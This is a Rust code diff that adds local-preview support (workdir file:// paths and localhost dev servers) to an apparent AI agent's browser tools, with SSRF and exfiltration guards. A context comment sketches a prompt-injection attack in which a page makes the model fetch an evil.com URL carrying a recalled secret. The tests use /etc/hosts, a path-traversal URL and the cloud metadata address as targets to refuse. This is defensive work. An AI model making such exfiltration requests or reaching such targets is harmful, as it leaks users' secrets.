@@ -89,6 +89,125 @@ fn is_blocked_ip(ip: &std::net::IpAddr) -> bool {
     is_blocked_ip_ex(ip, false)
 }
 
+/// What kind of LOCAL preview a browser URL is (if any). The browser tools support the common
+/// "build it, then look at it" workflow — previewing a file the agent just wrote, or a dev server
+/// it started on localhost — which the public-only SSRF guard would otherwise reject outright.
+pub(crate) enum LocalTarget {
+    /// A `file://` path (already confined to the workdir by the caller).
+    File(std::path::PathBuf),
+    /// An `http(s)://` loopback origin (localhost / 127.x / ::1).
+    Loopback,
+    /// Not a local preview — vet it as a normal public URL.
+    Public,
+}
+
+/// Classify a browser URL as a workdir file, a loopback origin, or a public URL. `file://` paths
+/// are percent-decoded and canonicalized, then required to sit INSIDE `workdir` (so the agent can
+/// only preview files it can also write — never `file:///etc/passwd`).
+pub(crate) fn classify_browse(url: &str, workdir: &std::path::Path) -> Result<LocalTarget, String> {
+    let u = url.trim();
+    if let Some(rest) = u.strip_prefix("file://") {
+        // file:///abs/path — strip an optional localhost authority, percent-decode, canonicalize.
+        let raw = rest.strip_prefix("localhost").unwrap_or(rest);
+        let decoded = percent_decode(raw);
+        let p = std::path::Path::new(&decoded);
+        let canon = p
+            .canonicalize()
+            .map_err(|_| format!("file not found: {decoded}"))?;
+        let root = workdir
+            .canonicalize()
+            .map_err(|e| format!("workdir error: {e}"))?;
+        if !canon.starts_with(&root) {
+            return Err(
+                "refusing to open a file outside the working directory (only files the agent \
+                 created here can be previewed)"
+                    .into(),
+            );
+        }
+        return Ok(LocalTarget::File(canon));
+    }
+    // http(s) loopback: localhost or a 127.x / ::1 literal.
+    let after = u.split_once("://").map(|(_, b)| b).unwrap_or("");
+    if after.is_empty() {
+        return Ok(LocalTarget::Public);
+    }
+    let hostport = after.split(['/', '?', '#']).next().unwrap_or("");
+    let hostport = hostport.rsplit('@').next().unwrap_or(hostport);
+    let host = if let Some(rest) = hostport.strip_prefix('[') {
+        rest.split(']').next().unwrap_or("")
+    } else {
+        hostport.split(':').next().unwrap_or(hostport)
+    };
+    let is_loopback = host.eq_ignore_ascii_case("localhost")
+        || host
+            .parse::<std::net::IpAddr>()
+            .map(|ip| ip.is_loopback())
+            .unwrap_or(false);
+    Ok(if is_loopback {
+        LocalTarget::Loopback
+    } else {
+        LocalTarget::Public
+    })
+}
+
+/// Minimal percent-decoder for `file://` paths (handles %20 etc.); leaves malformed escapes as-is.
+fn percent_decode(s: &str) -> String {
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+    while i < b.len() {
+        if b[i] == b'%' && i + 2 < b.len() {
+            if let (Some(h), Some(l)) = (hex_val(b[i + 1]), hex_val(b[i + 2])) {
+                out.push(h * 16 + l);
+                i += 3;
+                continue;
+            }
+        }
+        out.push(b[i]);
+        i += 1;
+    }
+    String::from_utf8_lossy(&out).into_owned()
+}
+fn hex_val(c: u8) -> Option<u8> {
+    match c {
+        b'0'..=b'9' => Some(c - b'0'),
+        b'a'..=b'f' => Some(c - b'a' + 10),
+        b'A'..=b'F' => Some(c - b'A' + 10),
+        _ => None,
+    }
+}
+
+/// The SSRF guard for the BROWSER tools: like [`guard_url`] but it also permits the two safe local-
+/// preview cases — a `file://` inside the workdir (any run: it's a local read, not network egress),
+/// and a loopback dev server on a CLEAN run (blocked once the lethal trifecta is armed, since then a
+/// localhost fetch is the SSRF-via-injected-content threat the guard exists for). Returns how the
+/// caller should reach it (skip connection-pinning for local; pin as usual for public).
+pub(crate) async fn guard_browse_url(
+    url: &str,
+    workdir: &std::path::Path,
+    trifecta: bool,
+) -> Result<LocalTarget, String> {
+    match classify_browse(url, workdir)? {
+        LocalTarget::File(p) => Ok(LocalTarget::File(p)),
+        LocalTarget::Loopback => {
+            if trifecta {
+                return Err(
+                    "refused: this run read untrusted content while holding private data, so \
+                     reaching a local address is blocked (SSRF guard). Ask the user to approve, or \
+                     run the preview in a fresh chat."
+                        .into(),
+                );
+            }
+            Ok(LocalTarget::Loopback)
+        }
+        LocalTarget::Public => {
+            guard_url(url).await?;
+            guard_exfil_url(url, trifecta)?;
+            Ok(LocalTarget::Public)
+        }
+    }
+}
+
 /// The exfiltration ceiling on a URL path when the lethal trifecta is armed (untrusted + sensitive).
 /// A GET's host+path is a data-OUT channel (markdown-image/GET beaconing): an injected page can tell
 /// the model to `web_fetch("https://evil.com/?q=<recalled-secret>")`, and the SSRF guard only blocks
@@ -620,6 +739,7 @@ pub fn sandbox_command(
 #[cfg(test)]
 mod ssrf_guard_tests {
     use super::{absolutize, guard_url, resolve_guarded, resolve_trusted};
+    use super::{classify_browse, guard_browse_url, LocalTarget};
 
     #[tokio::test]
     async fn blocks_internal_and_non_http_targets() {
@@ -649,6 +769,49 @@ mod ssrf_guard_tests {
         assert!(guard_url("http://[64:ff9b::a9fe:a9fe]/").await.is_err());
         // A normal public IPv6 is still allowed (no over-block).
         assert!(guard_url("http://[2606:4700::1]/").await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn browse_guard_allows_workdir_files_and_loopback_previews() {
+        let dir = tempfile::tempdir().unwrap();
+        let wd = dir.path();
+        std::fs::write(wd.join("page.html"), b"<h1>hi</h1>").unwrap();
+
+        // A file the agent created in its workdir: previewable on any run.
+        let u = format!("file://{}/page.html", wd.to_string_lossy());
+        assert!(matches!(
+            guard_browse_url(&u, wd, false).await,
+            Ok(LocalTarget::File(_))
+        ));
+        assert!(matches!(
+            guard_browse_url(&u, wd, true).await,
+            Ok(LocalTarget::File(_))
+        ));
+
+        // A file OUTSIDE the workdir is refused (no file:///etc/passwd).
+        assert!(guard_browse_url("file:///etc/hosts", wd, false).await.is_err());
+        // A workdir-relative traversal that escapes is refused.
+        let outside = format!("file://{}/../escape.html", wd.to_string_lossy());
+        assert!(guard_browse_url(&outside, wd, false).await.is_err());
+
+        // Loopback dev server: allowed on a CLEAN run, blocked once the trifecta is armed.
+        assert!(matches!(
+            guard_browse_url("http://localhost:8765/app.html", wd, false).await,
+            Ok(LocalTarget::Loopback)
+        ));
+        assert!(matches!(
+            guard_browse_url("http://127.0.0.1:3000/", wd, false).await,
+            Ok(LocalTarget::Loopback)
+        ));
+        assert!(guard_browse_url("http://localhost:8765/", wd, true).await.is_err());
+
+        // A public URL still classifies as public (and is vetted by guard_url downstream).
+        assert!(matches!(
+            classify_browse("https://example.com/", wd),
+            Ok(LocalTarget::Public)
+        ));
+        // A public host that resolves to a private IP is still refused on a clean run.
+        assert!(guard_browse_url("http://169.254.169.254/latest/", wd, false).await.is_err());
     }
 
     #[test]
@@ -2124,13 +2287,31 @@ async fn resolver_rule(url: &str) -> Result<String, String> {
     ))
 }
 
+/// The `--host-resolver-rules` pin defeats DNS-rebinding for PUBLIC hosts (resolve once, pin the
+/// IP so Chrome can't be redirected to a private address mid-load). A `file://` has no host and a
+/// loopback preview is intentional, so those skip the pin (and `resolve_guarded`, which rejects
+/// non-public IPs). Returns None when no pin is needed.
+async fn browse_pin(url: &str) -> Result<Option<String>, String> {
+    let u = url.trim();
+    if u.starts_with("file://") {
+        return Ok(None);
+    }
+    let host_local = classify_browse(u, std::path::Path::new("/"))
+        .map(|t| matches!(t, LocalTarget::Loopback))
+        .unwrap_or(false);
+    if host_local {
+        return Ok(None);
+    }
+    Ok(Some(resolver_rule(url).await?))
+}
+
 async fn chrome_dump_dom(url: &str, timeout: u64) -> Result<String, String> {
     let chrome = find_chrome().ok_or("no Chrome/Chromium found (set ENGRAM_CHROME)")?;
-    let pin = resolver_rule(url).await?;
+    let pin = browse_pin(url).await?;
     let fut = tokio::process::Command::new(&chrome)
         .args(CHROME_FLAGS)
         .arg(format!("--user-data-dir={}", chrome_profile_dir().display()))
-        .arg(&pin)
+        .args(pin.as_deref())
         .arg("--dump-dom")
         .arg(url)
         // Kill the headless Chrome if the timeout drops this future, so a hung render doesn't leak
@@ -2159,11 +2340,11 @@ async fn chrome_screenshot(
     timeout: u64,
 ) -> Result<(), String> {
     let chrome = find_chrome().ok_or("no Chrome/Chromium found (set ENGRAM_CHROME)")?;
-    let pin = resolver_rule(url).await?;
+    let pin = browse_pin(url).await?;
     let fut = tokio::process::Command::new(&chrome)
         .args(CHROME_FLAGS)
         .arg(format!("--user-data-dir={}", chrome_profile_dir().display()))
-        .arg(&pin)
+        .args(pin.as_deref())
         .arg("--hide-scrollbars")
         .arg("--window-size=1280,1024")
         .arg(format!("--screenshot={}", out_path.display()))
@@ -2203,10 +2384,10 @@ impl Tool for BrowserReadTool {
     }
     async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
         let url = arg_str(args, "url")?;
-        guard_url(url).await?;
-        // Same GET-exfiltration guard as web_fetch: a browse URL's query/path is a data-out channel.
+        // Permit previewing a workdir file or a loopback dev server (clean runs); public URLs are
+        // vetted + exfil-guarded exactly as before.
         let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
-        guard_exfil_url(url, trifecta)?;
+        guard_browse_url(url, &ctx.workdir, trifecta).await?;
         let _ = ctx
             .ledger
             .append("agent.browser_read", "agent", json!({ "url": url, "dest": crate::agent::host_of(url) }));
@@ -2223,9 +2404,10 @@ impl Tool for BrowserScreenshotTool {
         "browser_screenshot"
     }
     fn description(&self) -> &str {
-        "Screenshot the LIVE interactive browser session (the page you navigated to, with its \
-         cookies/login intact) to a PNG in the workdir. Pass an optional `url` to navigate there \
-         first, and an optional `question` to have the agent SEE and describe the screenshot."
+        "Screenshot a page to a PNG in the workdir. Pass an optional `url` to navigate there first \
+         (and an optional `question` to have the agent SEE and describe the shot). To preview \
+         something you just built, pass a file:// URL to an HTML file in the working directory \
+         (e.g. file:///.../index.html) or a http://localhost:PORT dev-server URL - both work."
     }
     fn schema(&self) -> Value {
         json!({ "type": "object",
@@ -2247,9 +2429,18 @@ impl Tool for BrowserScreenshotTool {
         // Navigate the LIVE session first when a url is given, so the shot reflects the real,
         // authenticated, multi-step page (not a throwaway cookieless Chrome).
         if let Some(url) = args["url"].as_str() {
-            guard_url(url).await?;
             let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
-            guard_exfil_url(url, trifecta)?;
+            let target = guard_browse_url(url, &ctx.workdir, trifecta).await?;
+            // A workdir file or loopback preview goes straight to the one-shot standalone capture
+            // (the interactive CDP session's Fetch interception + post-nav public-origin guard are
+            // built for untrusted web browsing, not a local file/dev-server preview).
+            if !matches!(target, LocalTarget::Public) {
+                chrome_screenshot(url, &path, ctx.policy.timeout_secs.max(30)).await?;
+                let _ = ctx
+                    .ledger
+                    .append("agent.browser_screenshot", "agent", json!({ "path": rel }));
+                return screenshot_answer(args, &path, ctx).await;
+            }
             ctx.browser.open(url).await?;
         }
         let _ = ctx
@@ -2263,30 +2454,39 @@ impl Tool for BrowserScreenshotTool {
                 None => return Err(e),
             }
         }
-        // Vision-in-the-loop: when asked a question, the agent actually SEES the page by routing
-        // the PNG through the multimodal gateway, returning the description as its observation.
-        if let Some(question) = args["question"].as_str().filter(|q| !q.is_empty()) {
-            let bytes = tokio::fs::read(&path).await.map_err(|e| e.to_string())?;
-            let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
-            let model = ctx
-                .policy
-                .vision_model
-                .clone()
-                .or_else(|| std::env::var("ENGRAM_VISION_MODEL").ok())
-                .unwrap_or_else(|| ctx.model.clone());
-            let req = CompletionRequest::new(model, vec![Message::user_with_image(question, b64)]);
-            let c = ctx
-                .gateway
-                .complete(Call::new(req).actor("agent").tainted(ctx.taint))
-                .await
-                .map_err(|e| e.to_string())?;
-            return Ok(format!("[saved {}] {}", path.display(), c.text));
-        }
-        Ok(format!(
-            "saved screenshot to {} (use vision_analyze or pass a question to read it)",
-            path.display()
-        ))
+        screenshot_answer(args, &path, ctx).await
     }
+}
+
+/// After a screenshot is on disk: if a `question` was asked, route the PNG through the multimodal
+/// gateway so the agent actually SEES the page; otherwise just report the saved path. Shared by the
+/// local-preview and interactive-session capture paths.
+async fn screenshot_answer(
+    args: &Value,
+    path: &std::path::Path,
+    ctx: &ToolCtx,
+) -> Result<String, String> {
+    if let Some(question) = args["question"].as_str().filter(|q| !q.is_empty()) {
+        let bytes = tokio::fs::read(path).await.map_err(|e| e.to_string())?;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
+        let model = ctx
+            .policy
+            .vision_model
+            .clone()
+            .or_else(|| std::env::var("ENGRAM_VISION_MODEL").ok())
+            .unwrap_or_else(|| ctx.model.clone());
+        let req = CompletionRequest::new(model, vec![Message::user_with_image(question, b64)]);
+        let c = ctx
+            .gateway
+            .complete(Call::new(req).actor("agent").tainted(ctx.taint))
+            .await
+            .map_err(|e| e.to_string())?;
+        return Ok(format!("[saved {}] {}", path.display(), c.text));
+    }
+    Ok(format!(
+        "saved screenshot to {} (use vision_analyze or pass a question to read it)",
+        path.display()
+    ))
 }
 
 pub struct BrowserWaitTool;
@@ -2351,8 +2551,10 @@ impl Tool for BrowserOpenTool {
         "browser_open"
     }
     fn description(&self) -> &str {
-        "Navigate the persistent interactive browser to a URL and return the page text. \
-         Follow with browser_click / browser_type / browser_extract for multi-step tasks."
+        "Navigate the interactive browser to a URL and return the page text. Follow with \
+         browser_click / browser_type / browser_extract for multi-step tasks. Also opens a \
+         file:// path inside the working directory or a http://localhost dev server to preview \
+         something you just built."
     }
     fn schema(&self) -> Value {
         json!({ "type": "object", "properties": { "url": { "type": "string" } }, "required": ["url"] })
@@ -2365,13 +2567,17 @@ impl Tool for BrowserOpenTool {
     }
     async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
         let url = arg_str(args, "url")?;
-        guard_url(url).await?;
-        // Same GET-exfiltration guard as web_fetch: a navigation URL's query/path is a data-out channel.
         let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
-        guard_exfil_url(url, trifecta)?;
+        let target = guard_browse_url(url, &ctx.workdir, trifecta).await?;
         let _ = ctx
             .ledger
             .append("agent.browser_open", "agent", json!({ "url": url, "dest": crate::agent::host_of(url) }));
+        // A workdir file / loopback preview: one-shot render (the interactive CDP session's Fetch
+        // interception + post-nav public-origin guard are for untrusted web browsing, not previews).
+        if !matches!(target, LocalTarget::Public) {
+            let html = chrome_dump_dom(url, ctx.policy.timeout_secs.max(30)).await?;
+            return Ok(html_to_text(&html));
+        }
         ctx.browser.open(url).await
     }
 }
